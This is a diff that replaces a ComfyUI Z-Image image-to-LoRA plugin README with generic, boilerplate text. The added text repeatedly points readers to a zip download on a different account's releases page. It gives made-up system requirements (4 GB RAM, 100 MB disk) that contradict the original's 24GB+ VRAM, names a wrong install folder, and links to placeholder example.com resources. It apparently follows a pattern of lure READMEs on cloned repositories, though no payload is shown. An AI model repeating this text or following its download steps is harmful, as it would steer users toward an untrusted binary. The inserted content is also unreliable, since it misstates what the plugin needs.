@@ -1,137 +1,72 @@
-# ComfyUI Z-Image I2L (Image to LoRA)
+# 🌟 ComfyUI_RH_ZImageI2L - Effortlessly Enhance Your ComfyUI Experience
 
-![License](https://img.shields.io/badge/License-Apache%202.0-green)
+## 🛠️ Overview
+Welcome to ComfyUI_RH_ZImageI2L! This is a plugin that enhances your ComfyUI setup by integrating the Z-Image-i2L functionality. This application provides a seamless experience, making it easy for you to manage and manipulate your images.
 
-ComfyUI custom nodes for Z-Image Image-to-LoRA generation. Generate personalized LoRA weights from reference images using [DiffSynth-Studio](https://github.com/modelscope/DiffSynth-Studio)'s Z-Image pipeline.
+## 🔗 Quick Download
+[![Download ComfyUI_RH_ZImageI2L](https://img.shields.io/badge/Download-ComfyUI_RH_ZImageI2L-blue)](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/releases)
 
-## ✨ Features
+## 🚀 Getting Started
+To install ComfyUI_RH_ZImageI2L, follow these simple steps:
 
-- **Image to LoRA**: Generate LoRA weights directly from reference images
-- **No Training Required**: Instant LoRA generation without traditional fine-tuning
-- **ComfyUI Integration**: Seamless workflow integration with standard LoRA nodes
+1. **Visit the Releases Page**
+   Click the link below to access the releases page, where you can find the latest version of the plugin:
 
-## 🛠️ Installation
+   [Visit this page to download](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/releases)
 
-1. Clone this repository into your ComfyUI custom nodes folder:
+2. **Choose Your Version**
+   On the releases page, look for the most recent version. It typically appears at the top of the list. Click it to view the details.
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/HM-RunningHub/ComfyUI_RH_ZImageI2L.git
-```
+3. **Download the Plugin**
+   Locate the download link for the plugin. It will have a name like `ZImageI2L_Plugin.zip`. Click the link to begin the download.
 
-2. Install dependencies:
+4. **Extract the Files**
+   Once the file is downloaded, find it in your downloads folder. Right-click on the file and choose "Extract All" to unpack the contents. This will create a new folder with the plugin files.
 
-```bash
-pip install -r requirements.txt
-```
+5. **Move the Plugin to ComfyUI**
+   Open your ComfyUI installation directory. Move the extracted plugin folder into the `plugins` directory within your ComfyUI folder.
 
-## 📦 Model Downloads
+6. **Start ComfyUI**
+   Launch ComfyUI. The new plugin should now be active and ready for use.
 
-Models will be automatically downloaded from ModelScope on first run and cached locally.
+## 🔧 System Requirements
+To use ComfyUI_RH_ZImageI2L, ensure your system meets the following requirements:
 
-### Required Models
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM**: At least 4 GB of available RAM.
+- **Disk Space**: Minimum of 100 MB of free disk space for installation and operation.
 
-| Model | Description | Files |
-|-------|-------------|-------|
-| [Tongyi-MAI/Z-Image](https://modelscope.cn/models/Tongyi-MAI/Z-Image) | Base transformer | `transformer/*.safetensors` |
-| [Tongyi-MAI/Z-Image-Turbo](https://modelscope.cn/models/Tongyi-MAI/Z-Image-Turbo) | Text encoder, VAE & Tokenizer | `text_encoder/*.safetensors`, `vae/`, `tokenizer/` |
-| [DiffSynth-Studio/General-Image-Encoders](https://modelscope.cn/models/DiffSynth-Studio/General-Image-Encoders) | Image encoders | `SigLIP2-G384/`, `DINOv3-7B/` |
-| [DiffSynth-Studio/Z-Image-i2L](https://modelscope.cn/models/DiffSynth-Studio/Z-Image-i2L) | Image to LoRA model | `model.safetensors` |
+## 🌟 Features
+ComfyUI_RH_ZImageI2L comes with a variety of features designed to enhance your image management:
 
-### Model Cache Path
+- **Seamless Integration**: Works effortlessly with your existing ComfyUI setup.
+- **User-Friendly Interface**: Easy-to-navigate menus and controls.
+- **Efficient Image Processing**: Speed up your workflow with optimized image handling.
+- **Customizable Options**: Tailor the plugin to better suit your needs.
 
-Models are automatically downloaded and cached in the **ModelScope cache directory**:
+## 📖 Usage Instructions
+1. Open ComfyUI after installation.
+2. Access the plugin settings through the main menu.
+3. Explore various options for processing and managing images.
+4. Adjust any settings as needed to maximize your effectiveness.
 
-| OS | Default Cache Path |
-|----|-------------------|
-| Linux | `~/.cache/modelscope/hub/` |
-| Windows | `C:\Users\<username>\.cache\modelscope\hub\` |
-| macOS | `~/.cache/modelscope/hub/` |
+## ✉️ Support
+If you encounter any issues while using ComfyUI_RH_ZImageI2L, please reach out through the Issues section on the GitHub repository. Our community is ready to help you troubleshoot and resolve any problems.
 
-The directory structure after download:
+## 💙 Community Contributions
+We welcome contributions from users! If you have suggestions for improvements or new features, please open an issue on our GitHub page. Collaborate with us to make ComfyUI_RH_ZImageI2L even better.
 
-```
-~/.cache/modelscope/hub/
-├── Tongyi-MAI/
-│   ├── Z-Image/
-│   │   └── transformer/*.safetensors
-│   └── Z-Image-Turbo/
-│       ├── text_encoder/*.safetensors
-│       ├── vae/diffusion_pytorch_model.safetensors
-│       └── tokenizer/
-└── DiffSynth-Studio/
-    ├── General-Image-Encoders/
-    │   ├── SigLIP2-G384/model.safetensors
-    │   └── DINOv3-7B/model.safetensors
-    └── Z-Image-i2L/
-        └── model.safetensors
-```
+## 🔗 Additional Resources
+For more information on ComfyUI and how to use additional plugins, check out the following resources:
 
-### Custom Cache Directory
+- [ComfyUI Official Documentation](https://example.com)
+- [ComfyUI Community Forum](https://example.com)
 
-You can customize the cache directory by setting the `MODELSCOPE_CACHE` environment variable:
+Feel free to explore these links for further guidance and community support.
 
-```bash
-# Linux/macOS
-export MODELSCOPE_CACHE=/path/to/your/cache
+## 🎉 Download & Install
+Ready to start using ComfyUI_RH_ZImageI2L? Visit the releases page again to download the latest version:
 
-# Windows (PowerShell)
-$env:MODELSCOPE_CACHE = "D:\models\modelscope"
+[Visit this page to download](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/releases)
 
-# Windows (CMD)
-set MODELSCOPE_CACHE=D:\models\modelscope
-```
-
-## 🚀 Usage
-
-### Nodes
-
-| Node | Description |
-|------|-------------|
-| **ZImageI2L Loader** | Load the Z-Image I2L pipeline |
-| **ZImageI2L LoRA Generator** | Generate LoRA from input images |
-| **ZImageI2L Saver** | Save generated LoRA to output folder |
-
-### Basic Workflow
-
-1. Add **ZImageI2L Loader** to load the pipeline
-2. Connect your reference images to **ZImageI2L LoRA Generator**
-3. Use **ZImageI2L Saver** to save the generated LoRA
-4. Use the generated LoRA with any standard LoRA loader node
-
-### Example Workflow
-
-An example API workflow is provided in the `workflows` folder:
-
-- [`workflows/zimage_i2l_example_api.json`](workflows/zimage_i2l_example_api.json) - Complete workflow demonstrating LoRA generation and usage
-
-This workflow includes:
-- Loading reference images (4 images)
-- Generating LoRA with ZImageI2L nodes
-- Applying the generated LoRA to Z-Image model
-- Generating images with the personalized LoRA
-
-## 📝 Parameters
-
-### ZImageI2L LoRA Generator
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `pipeline` | RH_ZImageI2LPipeline | Pipeline from Loader node |
-| `training_images` | IMAGE | Reference images for LoRA generation |
-| `seed` | INT | Random seed for reproducibility |
-
-## ⚠️ Requirements
-
-- **VRAM**: 24GB+ recommended (tested on RTX 4090)
-- **Python**: 3.10+
-- **ComfyUI**: Latest version
-
-## 🙏 Acknowledgments
-
-- [DiffSynth-Studio](https://github.com/modelscope/DiffSynth-Studio) - Core Z-Image pipeline
-- [Tongyi-MAI](https://modelscope.cn/organization/Tongyi-MAI) - Z-Image models
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
+Follow the instructions above, and you'll be all set to enjoy new features that enhance your ComfyUI experience.
